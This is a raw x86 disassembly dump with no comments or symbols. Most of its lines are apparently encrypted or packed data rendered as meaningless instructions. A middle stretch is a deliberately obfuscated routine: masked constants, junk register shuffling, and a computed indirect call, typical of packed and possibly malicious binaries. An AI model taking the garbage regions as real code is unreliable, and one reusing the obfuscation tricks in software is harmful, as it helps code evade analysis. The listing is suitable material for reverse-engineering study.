  41238e:	(bad)  
  41238f:	fistp  QWORD PTR [ecx-0x4b20083f]
  412395:	fsqrt  
  412397:	loopne 0x412399
  412399:	add    bh,bl
  41239b:	fprem1 
  41239d:	or     ecx,DWORD PTR [ebx]
  41239f:	into   
  4123a0:	add    al,0xd2
  4123a2:	shl    ah,1
  4123a4:	jecxz  0x41237a
  4123a6:	out    dx,eax
  4123a7:	int3   
  4123a8:	int    0xd3
  4123aa:	mov    ch,0xad
  4123ac:	cmc    
  4123ad:	aam    0xcf
  4123af:	std    
  4123b0:	add    ebx,ecx
  4123b2:	repz add edi,esi
  4123b5:	rol    edi,0xd5
  4123b8:	add    DWORD PTR [eax],ecx
  4123ba:	fild   DWORD PTR [ebx]
  4123bc:	sti    
  4123bd:	fcmovnb st,st(5)
  4123bf:	or     BYTE PTR [edx],cl
  4123c1:	mov    bl,0xbe
  4123c3:	repnz mov ebp,0xdbc6b0d6
  4123c9:	cli    
  4123ca:	out    dx,eax
  4123cb:	(bad)  
  4123cc:	int3   
  4123cd:	sar    ebp,cl
  4123cf:	std    
  4123d0:	out    dx,al
  4123d1:	mov    ebx,0xe4e102c3
  4123d6:	out    0xea,al
  4123d8:	fadd   st,st(1)
  4123da:	fucom  st(7)
  4123dc:	sar    al,0xd
  4123df:	cld    
  4123e0:	repz mov esp,0xc8c8dedc
  4123e6:	call   0xc70616c6
  4123eb:	neg    eax
  4123ed:	into   
  4123ee:	cld    
  4123ef:	fidivr WORD PTR [eax-0x1d1709]
  4123f5:	mov    ebx,0xf1eae7d4
  4123fa:	pop    es
  4123fb:	jmp    0xd241ece
  412400:	or     BYTE PTR [ecx-0x481e3229],bh
  412406:	rol    edi,1
  412408:	in     al,dx
  412409:	mov    dh,0xb0
  41240b:	mov    dh,0xce
  41240d:	in     eax,0xfe
  41240f:	retf   0xf4ce
  412412:	fcomi  st,st(2)
  412414:	(bad)  
  412416:	(bad)  
  412417:	cli    
  412418:	in     eax,0xf0
  41241a:	add    esp,edx
  41241c:	or     eax,0xe4fb0cdd
  412421:	leave  
  412422:	repz in eax,0xbc
  412425:	lock jmp 0xdeec:0xecb0c9e0
  41242d:	iret   
  41242e:	mov    esp,0xd5eeecd3
  412433:	std    
  412434:	sar    BYTE PTR [ebx-0x171f1a1d],0xca
  41243b:	jecxz  0x412413
  41243d:	retf   
  41243e:	loopne 0x41243d
  412440:	add    ecx,esp
  412442:	ret    0xa4df
  412445:	jmp    0xb4bb:0xf5d2ced3
  41244c:	mov    edi,0xf2ccfad3
  412451:	mov    ebx,0xdc03f4d6
  412456:	std    
  412457:	repz jmp 0xcb180a34
  41245d:	(bad)
  412460:	retf   
  412461:	fadd   st,st(4)
  412463:	out    dx,al
  412464:	call   0xcb13f956
  412469:	out    dx,eax
  41246a:	repz lock (bad) 
  41246d:	out    dx,eax
  41246e:	aam    0xd6
  412470:	sar    dh,1
  412472:	out    dx,eax
  412473:	add    ebp,ecx
  412475:	test   ah,0xf1
  412478:	(bad)  
  412479:	fadd   st,st(0)
  41247b:	out    dx,al
  41247c:	test   BYTE PTR [esp+eiz*8],0xcc
  412480:	retf   
  412481:	shl    DWORD PTR [esi-0x350b0f1e],0xe4
  412488:	repnz shl dl,0xeb
  41248c:	aad    0xcc
  41248e:	call   0x2fd284d
  412493:	(bad)  
  412494:	icebp  
  412495:	(bad)  
  412496:	(bad)  
  412498:	sti    
  412499:	fimul  WORD PTR [ecx]
  41249b:	iret   
  41249c:	out    0xc7,eax
  41249e:	(bad)  
  4124a0:	cli    
  4124a1:	mov    esp,0xd4d5c3ec
  4124a6:	int3   
  4124a7:	(bad)  
  4124a8:	mov    dh,0xda
  4124aa:	repz jmp 0xb1fe0d99
  4124b0:	cld    
  4124b1:	jecxz  0x412482
  4124b3:	(bad)  
  4124b4:	rol    BYTE PTR [esi+eax*1],cl
  4124b7:	fcmovbe st,st(2)
  4124b9:	(bad)  
  4124ba:	fmul   DWORD PTR [esi]
  4124bc:	fsubr  st,st(5)
  4124be:	in     eax,dx
  4124bf:	jmp    0xf110f28e
  4124c4:	repz shr BYTE PTR [edx-0x27361336],cl
  4124cb:	retf   0xddbb
  4124ce:	clc    
  4124cf:	(bad)  
  4124d1:	in     eax,dx
  4124d2:	mov    eax,0x1ffe6d3
  4124d7:	aad    0xca
  4124d9:	jmp    0x4124c3
  4124db:	add    eax,0xaffe80b
  4124e0:	or     eax,0xd0e5acaa
  4124e5:	ror    dh,1
  4124e7:	in     al,0xf4
  4124e9:	aad    0xf2
  4124eb:	lock neg ebp
  4124ee:	retf   
  4124ef:	call   0xd43027c6
  4124f4:	fcmovnb st,st(5)
  4124f6:	cmc    
  4124f7:	lds    eax,FWORD PTR [edi+edi*4]
  4124fa:	rcr    bl,1
  4124fc:	in     eax,0xf9
  4124fe:	or     esp,esp
  412500:	fistp  QWORD PTR [ecx-0x361d354f]
  412506:	leave  
  412507:	sti    
  412508:	call   0xd429fd08
  41250d:	cli    
  41250e:	iret   
  41250f:	mov    ebx,0xcee2f5da
  412514:	sar    dh,0xc1
  412517:	jmp    0x506:0xeafbdefe
  41251e:	or     al,0x3
  412520:	loope  0x4124f4
  412522:	jmp    0xc4361419
  412527:	rol    eax,cl
  412529:	loope  0x412521
  41252b:	mov    ebx,0xbec8ead3
  412530:	add    DWORD PTR [edi-0x18281100],esi
  412536:	ret    
  412537:	or     dl,dl
  412539:	les    ecx,FWORD PTR [ebx]
  41253b:	clc    
  41253c:	clc    
  41253d:	add    eax,0xc20bcdcd
  412542:	jmp    0x41251a
  412544:	in     eax,0xea
  412546:	in     eax,dx
  412547:	mov    cl,0xcc
  412549:	mov    ch,0xf0
  41254b:	jmp    0xc1ff:0xd2ecb4d7
  412552:	int3   
  412553:	jecxz  0x41253c
  412555:	sar    ebx,cl
  412557:	repnz fdiv st(5),st
  41255a:	(bad)  
  41255b:	or     esi,eax
  41255d:	out    0xce,al
  41255f:	int    0xff
  412561:	mov    ebp,0xbcdcf1ed
  412566:	icebp  
  412567:	cli    
  412568:	mov    ebx,0xc5e9dac1
  41256d:	(bad)  
  412570:	hlt    
  412571:	(bad)  
  412573:	sar    ch,1
  412575:	sar    eax,1
  412577:	mov    ebp,0xe20af7ff
  41257c:	aam    0xdb
  41257e:	add    edi,ebx
  412580:	fmul   st,st(1)
  412582:	int3   
  412583:	int3   
  412584:	rcl    cl,1
  412586:	jmp    0xe114d77f
  41258b:	mov    cl,0xda
  41258d:	leave  
  41258e:	cld    
  41258f:	in     eax,dx
  412590:	add    ebx,esp
  412592:	int    0xc7
  412594:	in     al,dx
  412595:	repnz loop 0x412577
  412598:	add    dh,bh
  41259a:	(bad)  
  41259b:	jmp    0xda1cf3a4
  4125a0:	adc    ch,BYTE PTR [ebp-0xe14193e]
  4125a6:	cmc    
  4125a7:	repnz (bad) 
  4125aa:	mul    bh
  4125ac:	les    esi,FWORD PTR [ebp-0x36213406]
  4125b2:	ret    
  4125b3:	aam    0xec
  4125b5:	fidivr DWORD PTR [ebp-0x17153d1b]
  4125bb:	cld    
  4125bc:	or     al,BYTE PTR ds:0xc1dfecef
  4125c2:	test   al,0xe0
  4125c4:	into   
  4125c5:	imul   dl
  4125c7:	(bad)  
  4125c8:	aam    0xb7
  4125ca:	(bad)  
  4125cb:	mov    ebx,0xe3e4efac
  4125d0:	mov    esp,0xe1befed5
  4125d5:	rol    cl,cl
  4125d7:	jmp    0x206:0xde09bfd0
  4125de:	(bad)  
  4125e0:	retf   0xcae4
  4125e3:	(bad)  
  4125e5:	mov    dh,0xda
  4125e8:	out    dx,eax
  4125e9:	lock fsincos 
  4125ec:	fdivrp st(5),st
  4125ee:	mov    eax,DWORD PTR [ecx+eax*4]
  4125f1:	mov    DWORD PTR [ebp-0x38],eax
  4125f4:	jmp    0x4125fe
  4125f9:	jmp    0x40d473
  4125fe:	mov    eax,DWORD PTR [ebp-0x2c]
  412601:	mov    ecx,DWORD PTR [ebp-0x3c]
  412604:	xor    ecx,0x75108b5
  41260a:	add    ecx,0x3272fb
  412610:	cmp    eax,ecx
  412612:	jne    0x41262a
  412618:	mov    eax,DWORD PTR [ebp-0x3c]
  41261b:	xor    eax,0x75108b5
  412620:	add    eax,0x3272fb
  412625:	jmp    0x414dde
  41262a:	mov    eax,DWORD PTR [ebp-0x8]
  41262d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412630:	xor    ecx,0x75108b5
  412636:	add    ecx,0x3272fb
  41263c:	cmp    eax,ecx
  41263e:	je     0x41290b
  412644:	lea    eax,[ebp-0x2c]
  412647:	mov    DWORD PTR [ebp-0x13c],eax
  41264d:	mov    eax,DWORD PTR [ebp-0x10]
  412650:	mov    DWORD PTR [ebp-0x138],eax
  412656:	mov    eax,DWORD PTR [ebp+0xc]
  412659:	mov    DWORD PTR [ebp-0x134],eax
  41265f:	mov    eax,DWORD PTR [ebp-0x134]
  412665:	movzx  eax,WORD PTR [eax+0x20]
  412669:	xor    eax,0x8a9a
  41266e:	add    eax,0x3b61
  412673:	movzx  eax,ax
  412676:	mov    DWORD PTR [ebp-0x114],eax
  41267c:	mov    BYTE PTR [ebp-0x85],0x7a
  412683:	lea    eax,[ebp-0x85]
  412689:	mov    DWORD PTR [ebp-0x10c],eax
  41268f:	movzx  eax,BYTE PTR [ebp-0x85]
  412696:	xor    eax,0x83
  41269b:	add    eax,0x8
  41269e:	mov    ecx,DWORD PTR [ebp-0x10c]
  4126a4:	mov    BYTE PTR [ecx],al
  4126a6:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  4126b0:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  4126ba:	mov    eax,DWORD PTR [ebp-0x118]
  4126c0:	xor    eax,0x75108b5
  4126c5:	add    eax,0x3272fb
  4126ca:	mov    DWORD PTR [ebp-0x120],eax
  4126d0:	jmp    0x4126e2
  4126d5:	mov    eax,DWORD PTR [ebp-0x120]
  4126db:	inc    eax
  4126dc:	mov    DWORD PTR [ebp-0x120],eax
  4126e2:	cmp    DWORD PTR [ebp-0x120],0x40
  4126e9:	jae    0x412707
  4126ef:	mov    eax,DWORD PTR [ebp-0x120]
  4126f5:	mov    cl,BYTE PTR [ebp-0x85]
  4126fb:	mov    BYTE PTR [ebp+eax*1-0xc8],cl
  412702:	jmp    0x4126d5
  412707:	mov    eax,DWORD PTR [ebp-0x118]
  41270d:	xor    eax,0x75108b5
  412712:	add    eax,0x3272fb
  412717:	mov    DWORD PTR [ebp-0x124],eax
  41271d:	jmp    0x41272f
  412722:	mov    eax,DWORD PTR [ebp-0x124]
  412728:	inc    eax
  412729:	mov    DWORD PTR [ebp-0x124],eax
  41272f:	mov    eax,DWORD PTR [ebp-0x114]
  412735:	cmp    DWORD PTR [ebp-0x124],eax
  41273b:	je     0x412791
  412741:	mov    eax,DWORD PTR [ebp-0x124]
  412747:	mov    ecx,DWORD PTR [ebp-0x134]
  41274d:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  412752:	xor    eax,0x8a9a
  412757:	add    eax,0x3b61
  41275c:	movzx  eax,ax
  41275f:	mov    DWORD PTR [ebp-0x128],eax
  412765:	mov    eax,DWORD PTR [ebp-0x124]
  41276b:	mov    ecx,DWORD PTR [ebp-0x134]
  412771:	movzx  eax,WORD PTR [ecx+eax*4]
  412775:	xor    eax,0x8a9a
  41277a:	add    eax,0x3b61
  41277f:	mov    ecx,DWORD PTR [ebp-0x128]
  412785:	mov    BYTE PTR [ebp+ecx*1-0xc8],al
  41278c:	jmp    0x412722
  412791:	mov    eax,DWORD PTR [ebp-0x118]
  412797:	xor    eax,0x75108b5
  41279c:	add    eax,0x3272fb
  4127a1:	mov    ecx,DWORD PTR [ebp-0x13c]
  4127a7:	mov    DWORD PTR [ecx],eax
  4127a9:	mov    eax,DWORD PTR [ebp-0x118]
  4127af:	xor    eax,0x75108b5
  4127b4:	add    eax,0x3272fb
  4127b9:	mov    DWORD PTR [ebp-0x110],eax
  4127bf:	mov    DWORD PTR [ebp-0x84],0xf89c95b0
  4127c9:	mov    eax,DWORD PTR [ebp-0x84]
  4127cf:	xor    eax,0x75108b5
  4127d4:	add    eax,0x3272fb
  4127d9:	je     0x4128ee
  4127df:	lea    eax,[ebp-0x130]
  4127e5:	mov    DWORD PTR [ebp-0x12c],eax
  4127eb:	mov    eax,DWORD PTR [ebp-0x110]
  4127f1:	sub    eax,0x3272fb
  4127f6:	xor    eax,0x75108b5
  4127fb:	mov    ecx,DWORD PTR [ebp-0x12c]
  412801:	mov    DWORD PTR [ecx],eax
  412803:	mov    eax,DWORD PTR [ebp-0x84]
  412809:	xor    eax,0x75108b5
  41280e:	add    eax,0x3272fb
  412813:	mov    ecx,DWORD PTR [ebp-0x11c]
  412819:	xor    ecx,0x75108b5
  41281f:	add    ecx,0x3272fb
  412825:	sub    eax,ecx
  412827:	sub    eax,0x3272fb
  41282c:	xor    eax,0x75108b5
  412831:	mov    DWORD PTR [ebp-0x84],eax
  412837:	mov    eax,DWORD PTR [ebp-0x110]
  41283d:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412845:	movsx  ecx,BYTE PTR [ebp-0x85]
  41284c:	cmp    eax,ecx
  41284e:	je     0x4128c6
  412854:	mov    eax,DWORD PTR [ebp-0x110]
  41285a:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412862:	mov    ecx,DWORD PTR [ebp-0x130]
  412868:	xor    ecx,0x75108b5
  41286e:	mov    edx,DWORD PTR [ebp-0x138]
  412874:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fb]
  41287c:	cmp    eax,ecx
  41287e:	je     0x41288e
  412884:	jmp    0x412906
  412889:	jmp    0x4128c6
  41288e:	mov    eax,DWORD PTR [ebp-0x130]
  412894:	xor    eax,0x75108b5
  412899:	mov    ecx,DWORD PTR [ebp-0x138]
  41289f:	movsx  eax,BYTE PTR [ecx+eax*1+0x3272fb]
  4128a7:	mov    ecx,DWORD PTR [ebp-0x118]
  4128ad:	xor    ecx,0x75108b5
  4128b3:	add    ecx,0x3272fb
  4128b9:	cmp    eax,ecx
  4128bb:	jne    0x4128c6
  4128c1:	jmp    0x4128ee
  4128c6:	mov    eax,DWORD PTR [ebp-0x11c]
  4128cc:	xor    eax,0x75108b5
  4128d1:	mov    ecx,DWORD PTR [ebp-0x110]
  4128d7:	lea    eax,[ecx+eax*1+0x3272fb]
  4128de:	mov    DWORD PTR [ebp-0x110],eax
  4128e4:	jmp    0x4127c9
  4128e9:	jmp    0x4127c9
  4128ee:	mov    eax,DWORD PTR [ebp-0x11c]
  4128f4:	xor    eax,0x75108b5
  4128f9:	add    eax,0x3272fb
  4128fe:	mov    ecx,DWORD PTR [ebp-0x13c]
  412904:	mov    DWORD PTR [ecx],eax
  412906:	jmp    0x41023e
  41290b:	mov    eax,DWORD PTR [ebp+0x8]
  41290e:	add    eax,DWORD PTR [ebp-0x38]
  412911:	mov    DWORD PTR [ebp-0x34],eax
  412914:	cmp    DWORD PTR [ebp-0x28],0x0
  412918:	je     0x4129d7
  41291e:	mov    DWORD PTR [ebp-0x4c],0x0
  412925:	push   edx
  412926:	pop    eax
  412927:	push   0x5
  412929:	sub    edx,eax
  41292b:	pop    edx
  41292c:	add    edx,0xa
  41292f:	push   edx
  412930:	pop    ecx
  412931:	push   0xa
  412933:	dec    ecx
  412934:	pop    ebx
  412935:	dec    ebx
  412936:	xchg   ebx,ecx
  412938:	sub    ebx,ecx
  41293a:	xchg   ebx,ecx
  41293c:	dec    ecx
  41293d:	mov    eax,DWORD PTR [ebp-0x28]
  412940:	imul   eax,ecx
  412943:	sub    esp,eax
  412945:	mov    DWORD PTR [ebp-0x4c],esp
  412948:	mov    eax,DWORD PTR [ebp-0x3c]
  41294b:	xor    eax,0x75108b5
  412950:	add    eax,0x3272fb
  412955:	mov    DWORD PTR [ebp-0x48],eax
  412958:	mov    eax,DWORD PTR [ebp-0x3c]
  41295b:	xor    eax,0x75108b5
  412960:	mov    ecx,DWORD PTR [ebp-0x48]
  412963:	lea    eax,[ecx+eax*1+0x3272fb]
  41296a:	mov    ecx,DWORD PTR [ebp-0x40]
  41296d:	xor    ecx,0x75108b5
  412973:	add    ecx,0x3272fb
  412979:	mov    edx,DWORD PTR [ebp+0x14]
  41297c:	imul   ecx,DWORD PTR [edx]
  41297f:	cmp    eax,ecx
  412981:	je     0x4129d7
  412987:	mov    ecx,DWORD PTR [ebp-0x3c]
  41298a:	xor    ecx,0x75108b5
  412990:	mov    esi,DWORD PTR [ebp-0x40]
  412993:	xor    esi,0x75108b5
  412999:	add    esi,0x3272fb
  41299f:	mov    eax,DWORD PTR [ebp-0x48]
  4129a2:	mov    edx,DWORD PTR [ebp+0x14]
  4129a5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4129a9:	xor    edx,edx
  4129ab:	div    esi
  4129ad:	lea    eax,[ecx+eax*1+0x3272fb]
  4129b4:	mov    ecx,DWORD PTR [ebp-0x48]
  4129b7:	mov    edx,DWORD PTR [ebp-0x4c]
  4129ba:	mov    DWORD PTR [edx+ecx*4],eax
  4129bd:	mov    eax,DWORD PTR [ebp-0x40]
  4129c0:	xor    eax,0x75108b5
  4129c5:	mov    ecx,DWORD PTR [ebp-0x48]
  4129c8:	lea    eax,[ecx+eax*1+0x3272fb]
  4129cf:	mov    DWORD PTR [ebp-0x48],eax
  4129d2:	jmp    0x412958
  4129d7:	mov    eax,DWORD PTR [ebp-0x3c]
  4129da:	xor    eax,0x75108b5
  4129df:	add    eax,0x3272fb
  4129e4:	mov    DWORD PTR [ebp-0x1c],eax
  4129e7:	and    ebx,0x76575654
  4129ed:	xor    ebx,0x54354364
  4129f3:	xchg   ebx,esi
  4129f5:	xor    ebx,ebx
  4129f7:	push   esi
  4129f8:	mov    esi,ebx
  4129fa:	pop    ebx
  4129fb:	mov    edx,esi
  4129fd:	add    ebx,0x1002
  412a03:	lea    eax,[ebp-0x34]
  412a06:	add    edx,eax
  412a08:	add    edx,0x5
  412a0b:	push   edx
  412a0c:	inc    esi
  412a0d:	pop    ecx
  412a0e:	dec    ecx
  412a0f:	xchg   ecx,eax
  412a10:	dec    eax
  412a11:	xchg   ecx,eax
  412a12:	dec    ecx
  412a13:	xchg   ecx,edx
  412a15:	dec    edx
  412a16:	push   edx
  412a17:	mov    edx,ebx
  412a19:	pop    ebx
  412a1a:	dec    ebx
  412a1b:	call   DWORD PTR [ebx]
  412a1d:	cmp    DWORD PTR [ebp+0x10],esi
  412a20:	je     0x412a41
  412a26:	xchg   edx,eax
  412a27:	push   0xc
  412a29:	pop    ecx
  412a2a:	dec    ecx
  412a2b:	push   0x3
  412a2d:	pop    ebx
  412a2e:	inc    ebx
  412a2f:	xchg   ebx,ecx
  412a31:	inc    ecx
  412a32:	sub    ebx,ecx
  412a34:	xchg   ebx,ecx
  412a36:	dec    ecx
  412a37:	dec    ecx
  412a38:	mov    eax,DWORD PTR [ebp-0x28]
  412a3b:	imul   eax,ecx
  412a3e:	add    esp,eax
  412a40:	xchg   edx,eax
  412a41:	push   eax
  412a42:	jmp    0x414dcb
  412a47:	ret    0xc368
  412a4a:	ret    
  412a4b:	jno    0x412abd
  412a4d:	ret    0x1568
  412a50:	rcl    BYTE PTR [edx],cl
  412a52:	clc    
  412a53:	stc    
  412a54:	or     al,0x8b
  412a56:	mov    BYTE PTR [esi+0x6d],al
  412a59:	jnp    0x412ad6
  412a5b:	out    0x98,eax
  412a5d:	jnp    0x412ada
  412a5f:	enter  0xffe3,0xbd
  412a63:	mov    ecx,0xdef806de
  412a68:	std    
  412a69:	out    0xc9,eax
  412a6b:	out    dx,eax
  412a6c:	(bad)  
  412a6d:	aad    0xfd
  412a6f:	out    0xe5,al
  412a71:	or     al,0xca
  412a73:	ret    0xf7af
  412a76:	retf   
  412a77:	in     al,dx
  412a78:	(bad)  
  412a79:	(bad)  
  412a7a:	mov    edx,0xbbd2c4cc
  412a7f:	jmp    0xbafee66c
  412a84:	fdivr  st,st(4)
  412a86:	(bad)  
  412a87:	xlat   BYTE PTR ds:[ebx]
  412a88:	retf   
  412a89:	clc    
  412a8a:	aam    0xdb
  412a8c:	xlat   BYTE PTR ds:[ebx]
  412a8d:	in     eax,0x6
  412a8f:	fcmove st,st(0)
  412a91:	(bad)  
  412a92:	in     eax,0xca
  412a94:	call   0xf311016a
  412a99:	mov    ebx,0xf8f9e6c8
  412a9e:	icebp  
  412a9f:	jmp    0x412a92
  412aa1:	add    esp,ebp
  412aa3:	enter  0x2e1,0xfd
  412aa7:	mov    esi,0xe8f0dff7
  412aac:	(bad)  
  412aae:	sti    
  412aaf:	fsub   st(1),st
  412ab1:	stc    
  412ab2:	int    0xa9
  412ab4:	int    0xee
  412ab6:	icebp  
  412ab7:	fsubr  st(3),st
  412ab9:	(bad)  
  412abb:	mov    bh,0xeb
  412abd:	retf   0xf8cf
  412ac0:	idiv   DWORD PTR [edx+edi*4-0xa472922]
  412ac7:	sar    esp,0xc7
  412aca:	(bad)  
  412acb:	jmp    0x92e08db
  412ad0:	enter  0xc3ce,0xc4
  412ad4:	loope  0x412a83
  412ad6:	stos   DWORD PTR es:[edi],eax
  412ad7:	out    dx,eax
  412ad8:	out    dx,al
  412ad9:	retf   0xf4fb
  412adc:	clc    
  412add:	mov    dh,0xef
  412adf:	fldlg2 
  412ae1:	jmp    0xd635e4bb
  412ae6:	lds    eax,FWORD PTR ds:0xcbdbcaf4
  412aec:	push   es
  412aed:	aad    0x8
  412aef:	ret    0xc4
  412af2:	jmp    0x412ad9
  412af4:	xlat   BYTE PTR ds:[ebx]
  412af5:	out    dx,eax
  412af6:	ffree  st(4)
  412af8:	rcr    ebx,cl
  412afa:	enter  0xb9f3,0xc6
  412afe:	aam    0xf4
  412b00:	aad    0xb0
  412b02:	call   0x536ffd7
  412b07:	ror    BYTE PTR [ebx],1
  412b09:	mov    eax,0xeac4dc09
  412b0e:	lds    eax,FWORD PTR [eax+ecx*8]
  412b11:	add    DWORD PTR [edi+esi*8-0x4c313a3f],ebp
  412b18:	mov    cl,0xcb
  412b1a:	(bad)  
  412b1b:	int3   
  412b1c:	int3   
  412b1d:	jmp    0xd3320706
  412b22:	shl    DWORD PTR [esi+0x2c1cec3],cl
  412b28:	repz ffreep st(6)
  412b2b:	jecxz  0x412b2a
  412b2d:	or     eax,0xfacafffc
  412b32:	ret    0xadc0
  412b35:	aad    0xb2
  412b37:	mov    al,0xb0
  412b39:	repnz in al,dx
  412b3b:	aad    0xec
  412b3d:	out    dx,al
  412b3e:	in     eax,0xd6
  412b40:	add    edi,eax
  412b42:	hlt    
  412b43:	(bad)  
  412b44:	cli    
  412b45:	in     eax,0xe5
  412b47:	add    dl,ch
  412b49:	(bad)  
  412b4b:	jmp    esi
  412b4d:	clc    
  412b4e:	cld    
  412b4f:	adc    eax,ecx
  412b51:	repnz int 0xd2
  412b54:	leave  
  412b55:	out    dx,al
  412b56:	mov    ebp,0xc1ccc5f4
  412b5b:	not    edx
  412b5d:	fcomip st,st(1)
  412b5f:	aad    0xef
  412b61:	mov    edi,0xbdfdf8f4
  412b66:	rcr    bh,cl
  412b68:	fdivr  st,st(3)
  412b6a:	lock neg ebp
  412b6d:	loop   0x412b6a
  412b6f:	or     al,0xc
  412b71:	add    eax,0xf3ecc6c2
  412b76:	shr    esp,cl
  412b78:	(bad)  
  412b79:	mov    al,0xec
  412b7b:	fbstp  TBYTE PTR [eax-0x102a411c]
  412b81:	mov    edx,0xbefeb9be
  412b86:	fiadd  DWORD PTR [ebx]
  412b88:	out    0xe7,al
  412b8a:	out    0xd8,al
  412b8c:	xlat   BYTE PTR ds:[ebx]
  412b8d:	add    eax,0xee1301e5
  412b92:	vshufps ymm5,ymm2,YMMWORD PTR [eax-0x34563b17],0xed
  412b9b:	iret   
  412b9c:	iret   
  412b9d:	fidivr DWORD PTR [esi-0x30330a4b]
  412ba3:	shl    edx,0xcd
  412ba6:	in     al,dx
  412ba7:	fsub   st,st(1)
  412ba9:	(bad)  
  412baa:	test   edx,0x508e2fc
  412bb0:	(bad)
  412bb3:	(bad)  [edi-0x344a1b51]
  412bb9:	fucompp 
  412bbb:	rcr    dl,cl
  412bbd:	imul   cl
  412bbf:	mov    ah,0xf6
  412bc1:	int    0xb8
  412bc3:	mov    ecx,0xcccdf5b5
  412bc8:	repnz (bad) 
  412bcb:	faddp  st(0),st
  412bcd:	cli    
  412bce:	jecxz  0x412b99
  412bd0:	or     al,bh
  412bd2:	into   
  412bd3:	shr    esp,cl
  412bd5:	loop   0x412bb8
  412bd7:	mov    dh,0xf6
  412bd9:	aad    0xf7
  412bdb:	aad    0xd5
  412bdd:	fcmovnu st,st(4)
  412bdf:	in     eax,dx
  412be0:	mov    ch,0xcd
  412be2:	lock add edx,ebx
  412be5:	int    0xc3
  412be7:	add    dl,dh
  412be9:	add    eax,0xe4fcd0df
  412bee:	std    
  412bef:	jecxz  0x412bc9
  412bf1:	into   
  412bf2:	mov    cl,0xf0
  412bf4:	shl    DWORD PTR [ebx-0x3b35164a],cl
  412bfa:	mov    ch,0xd3
  412bfc:	lock mov ch,0xdb
  412bff:	out    dx,al
  412c00:	in     al,dx
  412c01:	fistp  QWORD PTR [ebp-0x39232034]
  412c07:	stc    
  412c08:	cld    
  412c09:	idiv   ebx
  412c0b:	test   bh,0xef
  412c0e:	retf   
  412c0f:	add    eax,DWORD PTR [esp+eiz*8]
  412c12:	jmp    0xd4ef1bee
  412c17:	mov    al,0xd4
  412c19:	stc    
  412c1a:	mov    edx,0xd7cdc9df
  412c1f:	repz int3 
  412c21:	mov    eax,0xdad8f9d7
  412c26:	ret    
  412c27:	rcr    ebp,0xda
  412c2a:	or     bl,dh
  412c2c:	fucomip st,st(1)
  412c2e:	retf   
  412c2f:	or     esi,ebp
  412c31:	or     ebp,ecx
  412c33:	in     al,dx
  412c34:	int3   
  412c35:	mov    esp,0xccd1b2ea
  412c3a:	(bad)  
  412c3b:	repz cmc 
  412c3d:	fistp  QWORD PTR [edx-0x33152812]
  412c43:	fild   DWORD PTR [eax]
  412c45:	mov    esi,0xddb9ddf7
  412c4a:	rol    ecx,1
  412c4c:	loop   0x412c31
  412c4e:	sti    
  412c4f:	bswap  ebx
  412c51:	or     DWORD PTR [esi-0x341a2917],ebp
  412c57:	retf   0xbbe8
  412c5a:	shr    eax,cl
  412c5c:	(bad)  
  412c5d:	mov    eax,0xeffeffde
  412c62:	mov    bh,0xe3
  412c64:	bnd lock ret 
  412c67:	aad    0xb9
  412c69:	retf   0xc4dd
  412c6c:	cmc    
  412c6d:	lds    eax,FWORD PTR [edi]
  412c6f:	stc    
  412c70:	or     bl,dh
  412c72:	les    esi,FWORD PTR [eax-0x1b3e3209]
  412c78:	lods   eax,DWORD PTR ds:[esi]
  412c79:	lock out 0xb9,al
  412c7c:	mov    ecx,0xedd9febe
  412c81:	mov    esp,0xf6d0f7b9
  412c86:	add    ah,ah
  412c88:	push   es
  412c89:	xlat   BYTE PTR ds:[ebx]
  412c8a:	retf   
  412c8b:	stc    
  412c8c:	(bad)
  412c8f:	cld    
  412c90:	dec    edx
  412c92:	loope  0x412c87
  412c94:	in     eax,dx
  412c95:	enter  0xd1f6,0xf0
  412c99:	out    0xe8,al
  412c9b:	scas   al,BYTE PTR es:[edi]
  412c9c:	mov    cl,0xc9
  412c9e:	std    
  412c9f:	enter  0xd6eb,0xd8
  412ca3:	shr    ah,1
  412ca5:	in     eax,0xd2
  412ca7:	test   ch,0xf5
  412caa:	(bad)  
  412cab:	xlat   BYTE PTR ds:[ebx]
  412cac:	jecxz  0x412c8f
  412cae:	in     al,dx
  412caf:	in     eax,0xc5
  412cb1:	fucom  st(3)
  412cb3:	mov    esp,0xb7e8c0e5
  412cb8:	mov    ch,0xf6
  412cba:	(bad)
  412cbe:	cmc    
  412cbf:	(bad)  
  412cc1:	retf   0xecc2
  412cc4:	loop   0x412c9b
  412cc6:	loop   0x412cba
  412cc8:	repnz lds eax,FWORD PTR [edi]
  412ccb:	ror    BYTE PTR [ecx],0xfd
  412cce:	cld    
  412ccf:	loop   0x412cc9
  412cd1:	xadd   ch,ch
  412cd4:	mov    bl,0xd0
  412cd6:	out    0xee,al
  412cd8:	mov    dh,0xb5
  412cda:	out    dx,al
  412cdb:	mov    bh,0xd0
  412cdd:	mov    ch,0xc9
  412cdf:	stc    
  412ce0:	rcl    bl,1
  412ce2:	repnz sti 
  412ce4:	int3   
  412ce5:	shr    ah,1
  412ce7:	hlt    
  412ce8:	(bad)  
  412ce9:	jecxz  0x412cd1
  412ceb:	shr    ebx,0x8
  412cee:	call   0xd21b35b5
  412cf3:	mov    esi,0xc8cbc3c4
  412cf8:	in     al,dx
  412cf9:	cmc    
  412cfa:	cli    
  412cfb:	leave  
  412cfc:	fdiv   st,st(7)
  412cfe:	cld    
  412cff:	mov    ah,0xff
  412d01:	jmp    0x3:0xd307ec00
  412d08:	mov    ecx,0xfad401c0
  412d0d:	loop   0x412d09
  412d0f:	stc    
  412d10:	jmp    0xc5e1:0xb0c7f1fa
  412d17:	rcl    eax,0xf1
  412d1a:	cli    
  412d1b:	out    0xc6,eax
  412d1d:	iret   
  412d1e:	in     al,0xe8
  412d20:	mov    ebp,0xf701bedb
  412d25:	mov    ebp,0xfae3c3dd
  412d2a:	sar    eax,1
  412d2c:	(bad)  
  412d2e:	int    0xc6
  412d30:	loop   0x412d0a
  412d32:	fmul   st(1),st
  412d34:	lock out 0xd6,al
  412d37:	repnz lods al,BYTE PTR ds:[esi]
  412d39:	repnz xlat BYTE PTR ds:[ebx]
  412d3b:	mov    dh,0xd4
  412d3d:	out    dx,al
  412d3e:	mov    ch,0xe4
  412d40:	jecxz  0x412d16
  412d42:	mov    ecx,0xf1d0cde7
